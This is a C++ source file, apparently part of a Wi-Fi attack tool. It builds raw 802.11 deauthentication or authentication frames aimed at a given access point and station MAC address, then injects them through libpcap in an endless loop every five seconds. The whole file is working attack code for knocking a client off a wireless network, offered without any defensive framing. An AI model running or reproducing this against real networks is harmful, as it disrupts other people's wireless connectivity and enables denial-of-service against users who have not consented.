#include "deauth-attack.hpp"

void initDeauthPacket(deauth_packet& deauthPacket, const Param& param) {
    deauthPacket.radio.it_version = 0;
    deauthPacket.radio.it_pad = 0;
    deauthPacket.radio.it_len = 12;
    deauthPacket.radio.it_present = 0x00008004;

    deauthPacket.dataRate = 0x02;
    deauthPacket.zero = 0x00;
    deauthPacket.tx = 0x0018;

    deauthPacket.dot11.version = 0;
    deauthPacket.dot11.type = 0;
    deauthPacket.dot11.subtype = deauthPacket.dot11.Deauthentication;
    deauthPacket.dot11.flags = 0;
    deauthPacket.dot11.duration = 314;
    deauthPacket.dot11.addr1_ = param.getAPMAC();
    deauthPacket.dot11.addr2_ = param.getStationMAC();
    deauthPacket.dot11.addr3_ = param.getAPMAC();
    deauthPacket.dot11.frag = 0;
    deauthPacket.dot11.seq = 0x26;
    deauthPacket.reasonCode = 0x0003;
}

void initAuthPacket(deauth_packet& deauthPacket, const Param& param) {
    deauthPacket.radio.it_version = 0;
    deauthPacket.radio.it_pad = 0;
    deauthPacket.radio.it_len = 12;
    deauthPacket.radio.it_present = 0x00008004;

    deauthPacket.dataRate = 0x02;
    deauthPacket.zero = 0x00;
    deauthPacket.tx = 0x0018;

    deauthPacket.dot11.version = 0;
    deauthPacket.dot11.type = 0;
    deauthPacket.dot11.subtype = deauthPacket.dot11.Authentication;
    deauthPacket.dot11.flags = 0;
    deauthPacket.dot11.duration = 314;
    deauthPacket.dot11.addr1_ = param.getAPMAC();
    deauthPacket.dot11.addr2_ = param.getStationMAC();
    deauthPacket.dot11.addr3_ = param.getAPMAC();
    deauthPacket.dot11.frag = 0;
    deauthPacket.dot11.seq = 0x26;
    deauthPacket.reasonCode = 0x0003;
}

bool deauth_attack(const Param& param) {
    char* dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap;
    int res;

    deauth_packet deauthPacket;

    pcap = pcap_open_live(param.getInterface().data(), BUFSIZ, 1, 1000, errbuf);

    if(pcap == NULL) {
        std::cerr << "Error: Error while open device ";
        std::cerr << errbuf << std::endl;

        return 1;
    }

    if(param.isAuth()) initAuthPacket(deauthPacket, param);
    else initDeauthPacket(deauthPacket, param);

    while(not isEnd.load()) {
        if(pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauthPacket), sizeof(deauthPacket))) {
            std::cerr << "Error: Error while send packet\n";
            std::cerr << pcap_geterr(pcap) << std::endl;

            return false;
        }

        sleep(5);
    }

    pcap_close(pcap);

    return true;
}
